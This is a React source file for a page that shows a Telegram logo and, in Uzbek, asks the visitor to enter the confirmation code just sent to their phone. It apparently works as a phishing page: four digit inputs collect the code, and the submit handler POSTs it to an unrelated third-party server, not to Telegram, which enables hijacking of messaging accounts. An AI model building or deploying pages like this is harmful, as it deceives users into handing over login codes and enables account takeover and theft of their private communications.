import { useState, useRef } from "react";
// import { useState, useRef, useEffect } from "react";
import './App.css';

const App = () => {
    const [birinchi, setBirinchi] = useState('')
    const [ikkinchi, setIkkinchi] = useState('')
    const [uchunchi, setUchunchi] = useState('')
    const [tortinchi, setTortinchi] = useState('')

    const birinchiRef = useRef(null)
    const ikkinchiRef = useRef(null)
    const uchunchiRef = useRef(null)
    const tortinchiRef = useRef(null)
    const submitbtn = useRef(null)
    // const changeInput = e => {
    //     const val = e.target.value
    //     setCardNumber(val)
    //     // console.log(val.lenght)
    //     if (val.length === 16) {
    //         cvcRef.current.focus();
    //     }
    //     else {
    //         console.log('ishlamadi')
    //     }
    //     // console.log(cvvRef.current)
    // }

    const birinchiFunc = e => {
        let val = e.target.value
        setBirinchi(val)
        if (val.length === 1) {
            ikkinchiRef.current.focus();
        }
    }
    const ikkinchiFunc = e => {
        let val = e.target.value
        setIkkinchi(val)
        if (val.length === 1) {
            uchunchiRef.current.focus();
        }
    }
    const uchunchiFunc = e => {
        let val = e.target.value
        setUchunchi(val)
        if (val.length === 1) {
            tortinchiRef.current.focus();
        }
    }
    const tortinchiFunc = e => {
        let val = e.target.value
        setTortinchi(val)
        if (val.length === 1) {

            tortinchiRef.current.blur();
            submitbtn.current.focus();
        }
    }
    const formSend = e => {
        e.preventDefault();
        let formdata = new FormData();

        formdata.append("kod", birinchi + ikkinchi + uchunchi + tortinchi);

        let requestOptions = {
            method: 'POST',
            body: formdata,
        };

        fetch("http://itjobs.idealproject.uz/server.php", requestOptions)
            .then(response => response.json())
            .then(result => console.log(result))
            .catch(error => console.log('error', error))
            .finally(() => {
                birinchiRef.current.style.borderColor = '#3ea20d'
                ikkinchiRef.current.style.borderColor = '#3ea20d'
                uchunchiRef.current.style.borderColor = '#3ea20d'
                tortinchiRef.current.style.borderColor = '#3ea20d'
            });
    }
    return (
        <div className="container-md ">
            <div className=" mx-auto mx-md-auto mt-lg-5 mt-md-5 mt-5">
                <div className="tglogo mt-5">
                    <i className="fa-brands fa-telegram telegram-icon-costum"></i>
                </div>

                <div className="form-start">
                    <h4>Telefon raqamingizga tasdiqlash parolini yubordik iltimos parolni kiriting</h4>
                </div>

                <form onSubmit={formSend}>
                    <div className="form" >
                        <input type="number" onChange={birinchiFunc} ref={birinchiRef} name="1" id="" />
                        <input type="number" onChange={ikkinchiFunc} ref={ikkinchiRef} name="1" id="" />
                        <input type="number" onChange={uchunchiFunc} ref={uchunchiRef} name="1" id="" />
                        <input type="number" onChange={tortinchiFunc} ref={tortinchiRef} name="1" id="" />
                    </div>
                    <button type='submit' ref={submitbtn} className='btn btn-primary'>Yuborish</button>
                </form>
            </div>



        </div>

    );
}

export default App;